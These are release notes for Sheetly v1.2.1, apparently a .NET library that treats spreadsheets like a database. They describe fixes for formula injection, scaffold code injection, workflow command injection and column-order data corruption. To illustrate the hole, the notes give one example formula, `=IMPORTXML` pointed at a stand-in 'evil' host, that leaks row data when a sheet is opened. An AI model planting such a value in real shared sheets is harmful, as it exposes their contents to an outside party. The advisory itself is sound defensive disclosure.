# 🔒 Sheetly v1.2.1 — Security & Correctness Patch

## Entity Framework Core for Spreadsheets

**Release Date:** July 2026

A focused patch release. No new features and no breaking API changes — upgrade is a drop-in
replacement for v1.2.0. It closes two critical security holes and one silent data-corruption bug.

---

## 🔒 Security fixes

### Spreadsheet formula injection (critical)

End-user text that started with `=`, `+`, `-`, `@`, or a leading control character was written to
the sheet as a **live formula**. A value like `=IMPORTXML("https://evil","//x")` could exfiltrate
row contents when a human opened the shared sheet, and `=HYPERLINK(...)` could phish them. Such
values are now stored as **text literals** (a leading apostrophe marker Google consumes on write) and
are never evaluated as formulas. On read they come back as the original text.

> **Known limitation (fixed fully in v1.3.0):** Sheetly still writes with Google's `USER_ENTERED`
> mode, which coerces *number-* and *date-looking* strings (e.g. `"1,234"`, `"3/4"`, `"TRUE"`) into
> typed cells even when your property is a `string`. The formula-injection class above is closed, but
> if you store such strings in text columns they may not round-trip byte-for-byte until v1.3.0 moves
> writes to `RAW` mode. `decimal`/`double`/`DateTime`/`bool` properties are unaffected.

### Scaffold code injection (critical)

`dotnet sheetly scaffold` generated C# classes from the remote `__SheetlySchema__` sheet without
validating identifiers. Anyone with edit access to a shared spreadsheet could craft a class or
property name that compiled arbitrary code into your project on the next build, or a name like
`../../Program` that wrote outside the output folder. Scaffolded class names, property names, data
types, and file names are now strictly validated and sanitized.

### Sheet-name quoting (low)

A1-notation ranges now escape single quotes in sheet names (`'` → `''`), so a tab whose title
contains an apostrophe can no longer break out of a range reference.

### GitHub Actions hardening

Release workflows no longer interpolate the dispatch `version`/`package` inputs directly into shell
scripts (command-injection gap), and all workflows now declare least-privilege `permissions:`.

---

## 🐛 Correctness fixes

### Column-order data corruption (critical)

Writes were positional by property-declaration order while migrations append new columns at the end
of the sheet. Inserting a property in the **middle** of a model class silently scrambled every
subsequent insert/update — each value landing under the wrong header. Writes are now **header-driven**:
each value is written under its matching column header regardless of physical position. User-added
columns the model doesn't know about are left untouched; a model column missing from the sheet now
raises a clear "apply pending migrations" error instead of corrupting data.

### Model-hash drift on property reorder

Reordering properties (with no add/drop) changed the model hash even though the migration differ saw
no change, leaving the context permanently unable to start. The model hash is now order-insensitive,
and the startup check recomputes both sides so the comparison is algorithm-independent — existing
projects stuck in this state are rescued on upgrade.

### Migration generator compile-safety

Generated migration/snapshot code now escapes newlines, quotes, and backslashes in string values,
formats decimals/doubles with an invariant separator (no more `1,5m` on non-US machines), and
prefixes C#-keyword migration names with `@` — all of which previously produced code that wouldn't compile.

### Empty-schema guards

Migration bookkeeping no longer throws when the `__SheetlySchema__` sheet is present but empty.

---

## 📦 Packages

| Package | Version | Description |
|---|---|---|
| `Sheetly.Core` | 1.2.1 | Core abstractions, migrations, validation |
| `Sheetly.Google` | 1.2.1 | Google Sheets provider |
| `Sheetly.Excel` | 1.2.1 | Local Excel (.xlsx) provider |
| `dotnet-sheetly` | 1.2.1 | CLI tool (global tool) |
| `Sheetly.DependencyInjection` | 1.2.1 | ASP.NET Core DI integration |

---

## ⬆️ Upgrading

Drop-in from v1.2.0 — no code changes required. Behavior notes:

- Strings beginning with `=`, `+`, `-`, `@`, or a control character are now stored as text literals
  (previously they became live formulas). If you *intentionally* stored formulas via Sheetly, they
  will now be text.
- **Existing sheets are not rewritten.** Cells that v1.2.0 already turned into live formulas stay as
  formulas until you overwrite them — this patch only prevents *new* injected writes. Review shared
  sheets that took untrusted input under v1.2.0.
- `scaffold` sanitizes non-identifier class/property names and warns; verify generated files if your
  spreadsheet had unusual column names.

> 🔐 **Also recommended:** keep `credentials.json` out of source control (see the new Security note
> in the README), and share your sheet with the service account using least privilege.
